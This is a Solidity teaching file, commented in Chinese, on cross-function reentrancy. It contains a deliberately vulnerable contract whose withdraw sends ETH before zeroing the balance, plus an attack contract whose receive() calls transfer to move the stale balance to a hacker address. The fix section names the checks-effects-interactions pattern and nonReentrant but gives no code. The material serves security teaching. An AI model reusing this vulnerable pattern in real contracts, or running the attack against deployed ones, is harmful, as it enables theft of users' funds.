// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
/**
 * 跨函数重入攻击是更复杂的一种重入攻击方式，
 * 通常出现此问题的原因是多个函数相互共享同一状态变量，并且其中一些函数不安全地更新该变量。
 * 这种漏洞允许攻击者在一个函数执行期间通过另一个函数重新进入合约，操作尚未更新的状态数据。
 */

/*/////////////////////////////////////////////
                   被攻击合约 
/////////////////////////////////////////////*/
contract Vulnerable {
    // 共享状态变量
    mapping(address => uint256) public balances;

    //存款
    function deposit() public payable {
        balances[msg.sender] = msg.value;
    }

    //转账
    function transfer(address to, uint256 amount) public {
        if (balances[msg.sender] >= amount) {
            balances[to] += amount;
            balances[msg.sender] -= amount;
        }
    }

    //取款
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;
    }

    // 获取合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    // 获取账户余额
    function getAccountBalance(address _account) external view returns (uint256) {
        return balances[_account];
    }
}

/*/////////////////////////////////////////////
                攻击合约 
/////////////////////////////////////////////*/
/**
 * 在 withdraw 函数中用户可以提取 ETH，通过 call 低代码调用转账给用户，此时执行流转移到用户合约。
 * 如果用户合约是一个恶意合约，它可以在默认的 receive 函数中再次调用 transfer 函数，并将资产转移到指定地址中。
 */
contract Attack {
    Vulnerable target; // 被攻击目标
    address hacker_addr;
    uint256 amount;

    constructor(address _target, address _attacker) {
        target = Vulnerable(_target);
        hacker_addr = _attacker;
    }

    function attack() public payable {
        amount = msg.value;
        target.deposit{value: amount}(); // 存进合约
        target.withdraw(); // 接收合约传的ether,执行receive()方法
    }

    receive() external payable {
        // 跨函数重入
        target.transfer(hacker_addr, amount);
    }
}

/*/////////////////////////////////////////////
                修复合约
/////////////////////////////////////////////*/

/**
 * 为防止跨函数重入性攻击，推荐的做法是在进行所有关键状态更新之后再进行外部调用（上节讲解的 CEI 模式）。
 * 此外，使用像 OpenZeppelin 的nonReentrant修饰符也能有效防止此类问题，但是需要在多个函数上增加 nonReentrant
 */
